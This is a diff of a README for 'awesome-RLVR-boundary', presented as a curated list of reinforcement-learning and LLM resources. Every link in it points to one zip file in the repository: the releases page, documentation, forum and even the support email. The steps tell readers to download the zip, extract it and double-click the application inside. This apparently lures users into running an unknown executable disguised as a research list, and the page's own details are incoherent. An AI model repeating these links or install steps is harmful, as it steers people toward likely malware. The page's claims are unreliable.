@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download Release](https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip)
+[![Download Release](https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip%20Release-Click%20Here-brightgreen)](https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ awesome-RLVR-boundary offers a curated list of resources on Reinforcement Learni
 To get started with awesome-RLVR-boundary, follow these straightforward steps:
 
 1. **Visit the Releases Page**:  
-   Go to our [Releases page](https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip) to find the latest version.
+   Go to our [Releases page](https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip) to find the latest version.
 
 2. **Download the Files**:  
    On the Releases page, locate the latest build. Click on the link to download it to your computer. 
@@ -22,7 +22,7 @@ To get started with awesome-RLVR-boundary, follow these straightforward steps:
    Once the download completes, find the downloaded file in your downloads folder. Right-click on the file and select "Extract All" to unzip the contents.
 
 4. **Open the Application**:  
-   Navigate to the unzipped folder. Locate the `https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip` file (or a similar application file). Double-click to open it.
+   Navigate to the unzipped folder. Locate the `https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip` file (or a similar application file). Double-click to open it.
 
 5. **Follow On-Screen Instructions**:  
    The application will guide you through any necessary setup procedures.
@@ -59,7 +59,7 @@ If you encounter issues while downloading or running the application, consider t
 
 For additional help or inquiries, reach out to our support team:
 
-- **Email**: https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip  
+- **Email**: https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip  
 - **GitHub Issues**: Use the GitHub Issues page for any problems you cannot resolve. 
 - **Community Forum**: Join our forum for discussions and support from other users. 
 
@@ -69,8 +69,8 @@ We appreciate the effort of our contributors in building this resource. If you w
 
 ## 🔗 Links
 
-- [Releases page](https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip)  
-- [Documentation](https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip)  
-- [Community Forum](https://raw.githubusercontent.com/rorofaiz/awesome-RLVR-boundary/main/oostegitic/awesome-RLVR-boundary.zip)  
+- [Releases page](https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip)  
+- [Documentation](https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip)  
+- [Community Forum](https://github.com/rorofaiz/awesome-RLVR-boundary/raw/refs/heads/main/oostegitic/RLV_awesome_boundary_v3.6.zip)  
 
 Follow these steps to fully utilize awesome-RLVR-boundary and enhance your understanding of Reinforcement Learning and Large Language Models. We hope you find these resources valuable!
